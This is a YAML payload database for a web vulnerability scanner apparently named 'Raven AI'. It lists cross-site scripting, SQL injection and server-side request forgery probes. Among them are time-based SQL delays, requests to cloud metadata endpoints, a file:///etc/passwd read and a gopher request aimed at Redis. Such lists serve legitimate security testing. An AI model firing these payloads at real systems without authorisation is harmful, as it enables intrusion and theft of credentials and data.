# Raven AI - Payload Database
# Detection vectors for the core scanner modules.

# ── Cross-Site Scripting (XSS) ────────────────────────────────────────────────
xss:
  payloads:
    - "<script>alert(1)</script>"
    - "<img src=x onerror=alert(1)>"
    - "javascript:alert(1)"
    - "\"><script>alert(1)</script>"
    - "'><script>alert(1)</script>"
    - "<svg/onload=alert(1)>"
    - "<details/open/ontoggle=alert(1)>"
    - "<video><source onerror=\"alert(1)\">"
    - "'-alert(1)-'"
    - "\";alert(1)//"

  reflection_markers:
    - "alert(1)"
    - "<script>"
    - "onerror="
    - "onload="

# ── SQL Injection (SQLi) ──────────────────────────────────────────────────────
sqli:
  payloads:
    - "'"
    - "\""
    - "') OR '1'='1"
    - "\" OR \"1\"=\"1"
    - "' OR 1=1--"
    - "\" OR 1=1--"
    - "admin'--"
    - "' UNION SELECT NULL,NULL--"
    - "'; WAITFOR DELAY '0:0:5'--"
    - "') OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"

  error_signatures:
    - "SQL syntax"
    - "mysql_fetch"
    - "ORA-01756"
    - "SQLite3::Exception"
    - "PostgreSQL query failed"
    - "Microsoft OLE DB Provider for SQL Server"
    - "Unclosed quotation mark"
    - "supplied argument is not a valid MySQL"

# ── Server-Side Request Forgery (SSRF) ────────────────────────────────────────
ssrf:
  payloads:
    - "http://127.0.0.1"
    - "http://localhost"
    - "http://169.254.169.254/latest/meta-data/"
    - "http://instance-data"
    - "http://metadata.google.internal"
    - "http://[::]:80/"
    - "http://0.0.0.0"
    - "file:///etc/passwd"
    - "dict://127.0.0.1:6379/SET:test:test"
    - "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aconfig%0d%0a*4%0d%0a$3%0d%0aget%0d%0a$3%0d%0adir%0d%0a"
